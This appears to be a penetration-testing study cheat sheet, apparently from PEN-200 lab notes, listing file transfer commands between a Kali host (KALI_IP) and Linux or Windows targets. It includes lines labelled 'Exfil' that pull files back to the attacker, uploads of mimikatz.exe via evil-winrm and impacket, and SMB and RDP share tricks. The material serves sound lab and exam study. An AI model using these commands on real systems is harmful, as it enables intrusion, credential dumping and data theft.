# ***Linux***
## scp download
```
scp kali@KALI_IP:/home/kali/pen200/resources/FILE .
```
## wget
```shell
wget http://KALI_IP/linux/FILE -O outfile
wget -r -np http://KALI_IP/linux/
```

# ***Windows Target***
## xfreerdp
```shell
# 1 KALI
xfreerdp /u:username /p:password /v:target_ip /drive:smb,$PWD +clipboard +smart-sizing 


# Upload
# copy a file to where xfreerdp is running then
cp \\tsclient\smb\FILE FILE

# Exfil
cp FILE \\tsclient\smb\.


# For GUI: Go to NETWORK -> TSCLIENT and the share will be there
```
## impacket-smbserver
``` shell
# 1 KALI
impacket-smbserver smb . -smb2support [ -username user -password pass ]


# 2 Target
net use z: \\KALI_IP\smb [ /user:user pass ]

# FROM TARGET
# Download to TARGET
cp z:\FILE FILE

# Upload to KALO
cp FILE z:\.


# 3 Delete mapping after user
net use z: /delete
```
## impacket-psexec/wmiexec
```shell
# MUST USE C:\Windows path
lput mimikatz.exe # Upload (to C:\Windows\)
lget mimikatz.log # Exfil (from C:\Windows\)
```
## evil-winrm
```shell
# Upload
upload mimikatz.exe C:\windows\tasks\mimikatz.exe


# Exfil
download mimikatz.log /home/kali/Documents/pen-200`
```
## winhttpserver.exe
```shell
# 1 TARGET
.\winhttpserver.exe -i -p PORT folder_name

# 2 KALI
# Access through Firefox

# https://github.com/TheWaWaR/simple-http-server
```
